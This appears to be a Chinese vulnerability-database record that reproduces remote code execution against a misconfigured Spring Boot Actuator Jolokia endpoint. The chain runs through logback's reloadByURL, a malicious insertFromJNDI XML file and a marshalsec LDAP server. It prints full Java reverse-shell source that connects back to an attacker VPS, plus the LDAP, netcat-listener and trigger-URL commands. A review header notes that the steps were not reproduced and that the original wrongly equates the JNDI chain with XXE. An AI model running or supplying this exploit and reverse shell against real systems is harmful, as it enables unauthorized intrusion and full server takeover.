---
source: "hatch 补库批 20260928"
product: "Jolokia/Logback JNDI"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Spring Boot Actuator jolokia 配置不当导致的rce漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：Jolokia版本未知已承认；JDKLDAP边界6u201/7u191/8u182与其他条目不一致需官方核"
side_effects: "未执行；本文需注意的操作影响：实验依赖和持续连接风险；javac target1.5需旧编译器，反连代码静态块等待会阻塞调用；reload日志无恢复说明"
source_status: "unknown"
id: "vw-e25c4934f2cdbba4b060077e"
entity_id: "ve-e25c4934f2cdbba4b060077e"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Jolokia版本未知已承认；JDKLDAP边界6u201/7u191/8u182与其他条目不一致需官方核

代码与实验材料：完整六步及Java反连代码，需MBean已注册/exec允许、出网与加载条件；无修复和恢复

来源证据范围：LandGrey署名、marshalsec镜像，缺原研究直链

- **代码与转录边界（1）**：JNDI链与XXE被混为同一触发；依据：SAX解析XML不自动产生XXE，实际insertFromJNDI处理才请求LDAP；insertFormJNDI拼写错。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **适用与权限边界（2）**：失败原因过度归JDK高版本；依据：LDAP请求后无class也可能网络、类工厂或策略不匹配；需按远程codebase/本地gadget分条件。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（3）**：实验依赖和持续连接风险；依据：javac target1.5需旧编译器，反连代码静态块等待会阻塞调用；reload日志无恢复说明。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Spring Boot Actuator jolokia 配置不当导致的rce漏洞

一、漏洞简介
------------

### 利用条件：

-   目标网站存在 /jolokia 或 /actuator/jolokia 接口

-   目标使用了 jolokia-core 依赖（版本要求暂未知）并且环境中存在相关
    MBean

-   目标可以请求攻击者的 HTTP 服务器（请求可出外网）

-   ldap 注入可能会受目标 JDK 版本影响，jdk \< 6u201/7u191/8u182/11.0.1

二、漏洞影响
------------

三、复现过程
------------

### 漏洞原理

-   直接访问可触发漏洞的 URL，相当于通过 jolokia 调用
    ch.qos.logback.classic.jmx.JMXConfigurator 类的 reloadByURL 方法
-   目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容
-   目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)
-   xml 文件中利用 logback 依赖的 insertFormJNDI 标签，设置了外部 JNDI
    服务器地址
-   目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞

### 漏洞复现

### 步骤一：查看已存在的 MBeans

访问 **/jolokia/list** 接口，查看是否存在
**ch.qos.logback.classic.jmx.JMXConfigurator** 和 **reloadByURL**
关键词。![111.png](./.resource/SpringBootActuatorjolokia配置不当导致的rce漏洞/media/rId28.png)![222.png](./.resource/SpringBootActuatorjolokia配置不当导致的rce漏洞/media/rId29.png)

### 步骤二：托管 xml 文件

在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP
服务端口（80、443）

    使用 python 快速开启 http server

    python2 -m SimpleHTTPServer 80
    python3 -m http.server 80

在根目录放置以 xml 结尾的 ian.xml 文件，内容如下：

    <configuration>
      <insertFromJNDI env-entry-name="ldap://your-vps-ip:1389/JNDIObject" as="appName" />
    </configuration>

### 步骤三：准备要执行的 Java 代码

使用兼容低版本 jdk 的方式编译：

    javac -source 1.5 -target 1.5 JNDIObject.java

然后将生成的 **JNDIObject.class** 文件拷贝到刚刚用py开启的网站根目录。

    JNDIObject.java //请自行修改代码中反弹shell的ip和端口
    /**
     *  javac -source 1.5 -target 1.5 JNDIObject.java
     *
     *  Build By LandGrey
     * */

    import java.io.File;
    import java.io.InputStream;
    import java.io.OutputStream;
    import java.net.Socket;

    public class JNDIObject {
        static {
            try{
                String ip = "your-vps-ip";
                String port = "443";
                String py_path = null;
                String[] cmd;
                if (!System.getProperty("os.name").toLowerCase().contains("windows")) {
                    String[] py_envs = new String[]{"/bin/python", "/bin/python3", "/usr/bin/python", "/usr/bin/python3", "/usr/local/bin/python", "/usr/local/bin/python3"};
                    for(int i = 0; i < py_envs.length; ++i) {
                        String py = py_envs[i];
                        if ((new File(py)).exists()) {
                            py_path = py;
                            break;
                        }
                    }
                    if (py_path != null) {
                        if ((new File("/bin/bash")).exists()) {
                            cmd = new String[]{py_path, "-c", "import pty;pty.spawn(\"/bin/bash\")"};
                        } else {
                            cmd = new String[]{py_path, "-c", "import pty;pty.spawn(\"/bin/sh\")"};
                        }
                    } else {
                        if ((new File("/bin/bash")).exists()) {
                            cmd = new String[]{"/bin/bash"};
                        } else {
                            cmd = new String[]{"/bin/sh"};
                        }
                    }
                } else {
                    cmd = new String[]{"cmd.exe"};
                }
                Process p = (new ProcessBuilder(cmd)).redirectErrorStream(true).start();
                Socket s = new Socket(ip, Integer.parseInt(port));
                InputStream pi = p.getInputStream();
                InputStream pe = p.getErrorStream();
                InputStream si = s.getInputStream();
                OutputStream po = p.getOutputStream();
                OutputStream so = s.getOutputStream();
                while(!s.isClosed()) {
                    while(pi.available() > 0) {
                        so.write(pi.read());
                    }
                    while(pe.available() > 0) {
                        so.write(pe.read());
                    }
                    while(si.available() > 0) {
                        po.write(si.read());
                    }
                    so.flush();
                    po.flush();
                    Thread.sleep(50L);
                    try {
                        p.exitValue();
                        break;
                    } catch (Exception e) {
                    }
                }
                p.destroy();
                s.close();
            }catch (Throwable e){
                e.printStackTrace();
            }
        }
    }

![444.png](./.resource/SpringBootActuatorjolokia配置不当导致的rce漏洞/media/rId32.png)

### 步骤四：架设恶意 ldap 服务

下载 **marshalsec** ，使用下面命令架设对应的 **ldap** 服务：

    https://github.com/ianxtianxt/marshalsec

***ps:我这里发的是源码，需要用mvn编译marshalsec***

    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389

### 步骤五：监听反弹 shell 的端口

    nc -lvvp 你上一步代码里设置的端口

### 步骤六：从外部 URL 地址加载日志配置文件

    如果目标成功请求了ian.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。

替换实际的 your-vps-ip 地址访问 URL 触发漏洞：

    https://www.0-sec.org/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/ian.xml

**服务器请求日志**![请求1.png](./.resource/SpringBootActuatorjolokia配置不当导致的rce漏洞/media/rId36.png)![请求2.png](./.resource/SpringBootActuatorjolokia配置不当导致的rce漏洞/media/rId37.png)
